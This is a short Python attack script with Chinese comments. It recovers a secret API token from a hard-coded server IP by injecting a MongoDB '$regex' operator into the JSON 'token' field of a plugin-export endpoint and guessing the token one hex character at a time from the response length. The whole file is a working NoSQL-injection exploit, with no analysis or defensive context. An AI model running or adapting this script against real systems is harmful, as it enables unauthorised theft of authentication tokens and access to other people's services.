import json
import requests

if __name__ == '__main__':
    url = "http://8.210.94.11:3001/api/plugin/export"
    token = ''
    for i in range(50):
        old_token_len = len(token)
        for j in range(16):
            token_try = hex(j).replace("0x", "")  # 十六进制字符 0-9 和 a-f
            data = {
                "token": {
                    "$regex": "^" + token + token_try
                }
            }
            headers = {
                'Content-Type': 'application/json'
            }
            print(data)
            # 发送 POST 请求，传递 JSON 数据
            res = requests.post(url, json=data, headers=headers)

            # 如果响应的长度大于 50，说明当前字符正确
            if len(res.text) > 50:
                token += token_try
                print(f"Current token: {token}")
                break
        # 如果 token 长度没有增长，退出循环
        new_token_len = len(token)
        if old_token_len == new_token_len:
            print("Token discovery complete or no matching token found.")
            break
